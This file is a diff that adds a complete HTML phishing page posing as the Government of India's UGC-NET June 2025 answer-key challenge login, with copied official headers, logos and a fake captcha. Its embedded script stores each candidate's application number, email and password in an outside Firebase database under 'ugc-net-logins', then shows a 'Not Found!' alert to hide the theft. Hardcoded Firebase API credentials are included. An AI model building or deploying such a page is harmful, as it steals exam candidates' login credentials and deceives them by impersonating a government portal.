@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UGC-NET Login Page</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #fdf3e7;
+        }
+
+        header {
+            background-color: #fff;
+            border-bottom: 2px solid #f2aa4c;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        header img {
+            height: 100px;
+        }
+
+        header .logos {
+            display: flex;
+            align-items: center;
+            gap: 40px;
+        }
+
+        .orange-bar {
+            background-color: #f2aa4c;
+            color: #fff;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .login-container {
+            background: #fff;
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 30px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 6px;
+        }
+
+        .login-container h3 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+        }
+
+        .captcha-image {
+            font-weight: bold;
+            font-size: 20px;
+            color: #0033cc;
+            letter-spacing: 2px;
+            background: #f0f0f0;
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 4px;
+        }
+
+        .submit-btn {
+            background-color: #0047ab;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: #003799;
+        }
+
+        .note {
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="logos">
+            <img src="https://i.ibb.co/tTq0ypTy/Untitled-design-2.png" alt="Gov logo">
+            <div>
+                <strong>Department of Higher Education</strong><br>
+                Ministry of Education<br>
+                Government of India
+            </div>
+            <div>
+                <strong>University Grants Commission</strong><br>
+                Quality higher education for all
+            </div>
+        </div>
+        <img src="https://i.ibb.co/3YmP4x70/Untitled-design-1.png" alt="NTA logo" height="50">
+    </header>
+
+    <div class="orange-bar">UGC-NET JUNE-2025</div>
+
+    <div class="login-container">
+        <h3>Answerkey Challenge</h3>
+
+        <div class="form-group">
+            <label for="application">Application number *</label>
+            <input type="text" id="application" placeholder="Enter Application Number" required>
+        </div>
+
+        <div class="form-group">
+            <label for="email">Email Address *</label>
+            <input type="email" id="email" placeholder="Enter Email Address" required>
+        </div>
+
+        <div class="form-group">
+            <label for="password">Password *</label>
+            <input type="password" id="password" placeholder="Enter Password" required>
+        </div>
+
+        <div class="form-group">
+            <label for="captcha">Enter Security Pin (Case Sensitive) *</label><br>
+            <span class="captcha-image">9A40G8</span>
+            <input type="text" id="captcha" placeholder="Type the characters shown above" required>
+        </div>
+
+        <button class="submit-btn" id="submitBtn">Submit</button>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js';
+        import { getDatabase, ref, push, set } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js';
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCmDzcJExVTW2BFoQXMWSXDPMww7JsG6qc",
+            authDomain: "logintest-b939e.firebaseapp.com",
+            projectId: "logintest-b939e",
+            storageBucket: "logintest-b939e.firebasestorage.app",
+            messagingSenderId: "100538611587",
+            appId: "1:100538611587:web:b9b8b87139f12bf18568b6"
+        };
+
+
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        document.getElementById("submitBtn").addEventListener("click", () => {
+            const application = document.getElementById("application").value.trim();
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const captcha = document.getElementById("captcha").value.trim();
+
+            const expectedCaptcha = "9A40G8";
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!application || !email || !password || !captcha) {
+                alert("All fields are required.");
+                return;
+            }
+
+            if (!emailRegex.test(email)) {
+                alert("Please enter a valid email address.");
+                return;
+            }
+
+            if (captcha !== expectedCaptcha) {
+                alert("Incorrect security pin. Please enter it exactly as shown.");
+                return;
+            }
+
+            const userRef = push(ref(db, "ugc-net-logins"));
+            set(userRef, {
+                applicationNumber: application,
+                email: email,
+                password: password,
+                captcha: captcha
+            }).then(() => {
+                alert("Not Found!");
+                document.getElementById("application").value = "";
+                document.getElementById("email").value = "";
+                document.getElementById("password").value = "";
+                document.getElementById("captcha").value = "";
+            }).catch((err) => {
+                alert("Error: " + err.message);
+            });
+        });
+
+    </script>
+</body>
+
+</html>
